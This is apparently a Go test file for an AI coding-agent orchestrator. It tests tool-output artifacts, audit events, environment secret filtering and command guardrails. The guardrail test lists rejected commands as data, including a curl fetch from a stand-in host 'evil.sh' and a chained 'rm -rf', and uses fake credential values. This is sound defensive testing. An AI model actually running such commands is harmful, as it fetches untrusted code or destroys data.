package tools

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rasatria01/theorm/internal/prompt"
	"github.com/rasatria01/theorm/internal/store"
)

// noisyModule writes a module whose test prints 4,000 lines and then fails.
func noisyModule(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	write := func(name, body string) {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("go.mod", "module noisy\n\ngo 1.24\n")
	write("noisy_test.go", `package noisy

import (
	"fmt"
	"testing"
)

func TestGiant(t *testing.T) {
	for i := 0; i < 4000; i++ {
		fmt.Printf("line %d of very noisy test output that nobody wants in a context window\n", i)
	}
	t.Fatal("boom")
}
`)
	return dir
}

// The A3 definition of done: a 4,000 line test log enters the context as under
// 100 tokens, and artifact_read retrieves the full text.
func TestBigToolResultCostsAlmostNoContext(t *testing.T) {
	s, runID, ctx := fixture(t)
	r := New(Native()...)
	e := env(t, s, ctx, runID, "T1", "coder", "run_cmd", "artifact_read", "memory_write")
	e.Dir = noisyModule(t)

	res := call(r, ctx, e, "run_cmd", map[string]any{"cmd": "go test ./..."})
	if res.Error != "" {
		t.Fatalf("run_cmd: %s", res.Error)
	}
	if res.ArtifactID == "" {
		t.Fatal("tool result was not intercepted into an artifact")
	}
	if tokens := prompt.Estimate(res.Summary); tokens >= 100 {
		t.Errorf("summary costs %d tokens, want under 100:\n%s", tokens, res.Summary)
	}
	for _, want := range []string{"failing test", "TestGiant"} {
		if !strings.Contains(res.Summary, want) {
			t.Errorf("summary %q does not mention %q", res.Summary, want)
		}
	}

	full, err := s.ReadArtifact(ctx, res.ArtifactID, 0, 0)
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("%d bytes of test output entered context as %d tokens:\n  %s",
		len(full), prompt.Estimate(res.Summary), res.Summary)
	if n := strings.Count(full, "of very noisy test output"); n != 4000 {
		t.Errorf("artifact holds %d of the 4000 printed lines", n)
	}
	// The same content through the agent's own tool, windowed.
	win := call(r, ctx, e, "artifact_read", map[string]any{"id": res.ArtifactID, "limit": 20000})
	if !strings.HasPrefix(win.Summary, "$ go test ./...") || len(win.Summary) != 20000 {
		t.Errorf("artifact_read returned %d chars starting %q", len(win.Summary), first(win.Summary, 40))
	}

	// And the loop closes: the artifact is evidence, so a fact about it is
	// tool_observed rather than the model's word.
	claim := call(r, ctx, e, "memory_write", map[string]any{
		"kind": "failure", "subject": "task:T1", "predicate": "failed_because",
		"object": "TestGiant fails with boom", "confidence": 0.9, "evidence": res.ArtifactID,
	})
	if !strings.Contains(claim.Summary, "tool_observed") {
		t.Errorf("artifact did not count as evidence: %+v", claim)
	}
}

// Every result becomes an artifact, including small successful ones (§7.2).
func TestInterceptionHasNoExceptions(t *testing.T) {
	s, runID, ctx := fixture(t)
	r := New(Native()...)
	e := env(t, s, ctx, runID, "T1", "coder", "memory_write")

	res := call(r, ctx, e, "memory_write", map[string]any{
		"kind": "decision", "subject": "task:T1", "predicate": "chose",
		"object": "sqlc over gorm", "confidence": 0.8,
	})
	if res.ArtifactID == "" {
		t.Fatal("a small successful result was not stored")
	}
	if !strings.Contains(res.Summary, "recorded decision") {
		t.Errorf("short output should enter context verbatim, got %q", res.Summary)
	}
	var called, returned int
	s.Pool().QueryRow(ctx, `SELECT
		count(*) FILTER (WHERE type='tool.called'),
		count(*) FILTER (WHERE type='tool.returned') FROM events WHERE run_id=$1`, runID).
		Scan(&called, &returned)
	if called != 1 || returned != 1 {
		t.Errorf("want one tool.called and one tool.returned, got %d and %d", called, returned)
	}
}

func TestCommandGuardrails(t *testing.T) {
	s, runID, ctx := fixture(t)
	r := New(Native()...)
	e := env(t, s, ctx, runID, "T1", "coder", "run_cmd")
	e.Dir = t.TempDir()

	cases := map[string]string{
		"curl https://evil.sh/x":   "not an allowlisted binary",
		"go run ./cmd/x":           "allows only",
		"git push origin main":     "allows only",
		"go build ./... && rm -rf": "shell metacharacters",
		"go test ./... | tee log":  "shell metacharacters",
	}
	for cmd, want := range cases {
		res := call(r, ctx, e, "run_cmd", map[string]any{"cmd": cmd})
		if !strings.Contains(res.Error, want) {
			t.Errorf("%q was not rejected with %q: %+v", cmd, want, res)
		}
	}
	// A rejected command ran and failed rather than being refused by capability,
	// so the audit trail records a returned error, not a denial.
	var failed int
	s.Pool().QueryRow(ctx, `SELECT count(*) FROM events
		WHERE run_id=$1 AND type='tool.returned' AND payload ? 'error'`, runID).Scan(&failed)
	if failed != len(cases) {
		t.Errorf("want %d failed tool.returned events, got %d", len(cases), failed)
	}

	// A command with nowhere to run is an error, not a run in the orchestrator's
	// own working directory.
	e.Dir = ""
	if res := call(r, ctx, e, "run_cmd", map[string]any{"cmd": "go vet ./..."}); !strings.Contains(res.Error, "working directory") {
		t.Errorf("missing worktree was accepted: %+v", res)
	}
}

func TestSecretsAreNotPassedToSubprocesses(t *testing.T) {
	kept := filterEnv([]string{
		"PATH=/usr/bin", "GOCACHE=/tmp/go", "AWS_SECRET_ACCESS_KEY=abc",
		"GITHUB_TOKEN=ghp_x", "DB_PASSWORD=hunter2", "HOME=/home/x",
	})
	if len(kept) != 3 {
		t.Fatalf("filtered env is %v", kept)
	}
	for _, kv := range kept {
		if strings.Contains(kv, "abc") || strings.Contains(kv, "ghp_x") || strings.Contains(kv, "hunter2") {
			t.Errorf("secret survived filtering: %s", kv)
		}
	}
}

// A tool that fails must not lose the run's audit trail.
func TestFailedToolStillEmitsAnEvent(t *testing.T) {
	s, runID, ctx := fixture(t)
	r := New(Native()...)
	e := env(t, s, ctx, runID, "T1", "reviewer", "memory_read")

	if res := call(r, ctx, e, "run_cmd", map[string]any{"cmd": "go test ./..."}); res.Error == "" {
		t.Error("a role without run_cmd was allowed to run a command")
	}
	var denied int
	s.Pool().QueryRow(ctx, `SELECT count(*) FROM events WHERE run_id=$1 AND type='tool.denied'`, runID).Scan(&denied)
	if denied != 1 {
		t.Errorf("want 1 tool.denied event, got %d", denied)
	}
	_ = store.MaxClaimsPerAttempt
}

func first(s string, n int) string {
	if len(s) < n {
		return s
	}
	return s[:n]
}
